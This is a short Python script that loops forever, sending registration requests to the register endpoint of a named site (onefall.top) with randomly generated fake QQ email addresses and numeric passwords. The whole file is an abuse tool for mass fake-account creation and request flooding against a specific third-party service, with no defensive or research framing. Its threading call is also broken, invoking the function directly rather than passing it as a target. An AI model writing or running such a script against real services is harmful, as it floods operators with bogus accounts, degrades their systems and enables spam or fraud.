import requests
import random
import time
import threading

def regist():
    url = "https://onefall.top/api/v1/passport/auth/register"
    qq_num = random.randint(1,9999999999)

    qq_email = "%d@qq.com" % qq_num

    qq_password = random.randint(1,999999999999)

    data = {
        "email": qq_email,
        "password": qq_password
    }

    r = requests.post(url=url,data=data)
    print(r)


while(True):
    t1 = threading.Thread(target=regist())
    t1.start()






